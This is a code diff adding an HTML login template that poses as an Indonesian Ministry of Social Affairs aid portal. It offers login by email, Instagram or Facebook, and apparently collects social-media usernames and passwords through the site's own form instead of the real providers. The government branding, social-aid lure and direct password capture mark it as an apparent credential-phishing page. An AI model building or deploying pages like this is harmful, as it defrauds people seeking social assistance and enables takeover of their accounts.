@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Bantuan Sosial</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 440px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #1e3c72, #2a5298);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .logo-icon {
+            font-size: 56px;
+            color: #1e3c72;
+            margin-bottom: 16px;
+            display: block;
+        }
+        
+        .logo h1 {
+            color: #1e3c72;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }
+        
+        .logo p {
+            color: #64748b;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #374151;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #f8fafc;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1e3c72;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(30, 60, 114, 0.1);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 17px;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(30, 60, 114, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .login-options {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 28px;
+            background: #f8fafc;
+            padding: 8px;
+            border-radius: 12px;
+        }
+        
+        .login-option {
+            flex: 1;
+            padding: 14px;
+            text-align: center;
+            border: 2px solid transparent;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 14px;
+            font-weight: 600;
+            color: #64748b;
+            background: white;
+        }
+        
+        .login-option.active {
+            border-color: #1e3c72;
+            background: white;
+            color: #1e3c72;
+            box-shadow: 0 2px 10px rgba(30, 60, 114, 0.1);
+        }
+        
+        .error {
+            background: #fef2f2;
+            color: #dc2626;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            text-align: center;
+            border: 1px solid #fecaca;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .register-link {
+            text-align: center;
+            margin-top: 32px;
+            color: #64748b;
+            font-size: 15px;
+        }
+        
+        .register-link a {
+            color: #1e3c72;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        
+        .register-link a:hover {
+            color: #2a5298;
+        }
+        
+        .info-box {
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+            color: #0369a1;
+            padding: 16px;
+            border-radius: 12px;
+            margin-top: 24px;
+            font-size: 14px;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #64748b;
+            cursor: pointer;
+            font-size: 18px;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 40px 24px;
+            }
+            
+            .logo h1 {
+                font-size: 22px;
+            }
+            
+            .login-options {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <span class="logo-icon">🔐</span>
+            <h1>Masuk ke Akun</h1>
+            <p>Kementerian Sosial Republik Indonesia</p>
+        </div>
+
+        {% if error %}
+        <div class="error">{{ error }}</div>
+        {% endif %}
+
+        <form method="POST">
+            <div class="form-group">
+                <label>Pilih Metode Login</label>
+                <div class="login-options">
+                    <div class="login-option active" onclick="selectLoginType('email')">
+                        📧 Email
+                    </div>
+                    <div class="login-option" onclick="selectLoginType('instagram')">
+                        📷 Instagram
+                    </div>
+                    <div class="login-option" onclick="selectLoginType('facebook')">
+                        👥 Facebook
+                    </div>
+                </div>
+                <input type="hidden" name="login_type" id="login_type" value="email">
+            </div>
+
+            <div class="form-group">
+                <label for="email" id="email_label">Alamat Email</label>
+                <input type="text" id="email" name="email" value="{{ request.form.get('email', '') }}" required 
+                       placeholder="contoh: nama@email.com">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Kata Sandi</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" required 
+                           placeholder="Masukkan kata sandi Anda">
+                    <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
+                </div>
+            </div>
+
+            <button type="submit" class="btn">
+                Masuk ke Akun
+            </button>
+        </form>
+
+        <div class="info-box">
+            📞 Butuh bantuan? Hubungi call center: 1500-123
+        </div>
+
+        <div class="register-link">
+            Belum memiliki akun? <a href="{{ url_for('register') }}">Daftar di sini</a>
+        </div>
+    </div>
+
+    <script>
+        function selectLoginType(type) {
+            document.getElementById('login_type').value = type;
+            
+            // Update active class
+            document.querySelectorAll('.login-option').forEach(option => {
+                option.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Update label and placeholder
+            const emailLabel = document.getElementById('email_label');
+            const emailInput = document.getElementById('email');
+            
+            if (type === 'instagram') {
+                emailLabel.textContent = 'Username Instagram';
+                emailInput.placeholder = 'masukkan username Instagram Anda';
+            } else {
+                emailLabel.textContent = 'Alamat Email';
+                emailInput.placeholder = 'contoh: nama@email.com';
+            }
+        }
+        
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleButton = document.querySelector('.toggle-password');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleButton.textContent = '🔒';
+            } else {
+                passwordInput.type = 'password';
+                toggleButton.textContent = '👁️';
+            }
+        }
+        
+        // Add smooth animations
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.parentElement.classList.add('focused');
+                });
+                input.addEventListener('blur', function() {
+                    this.parentElement.classList.remove('focused');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
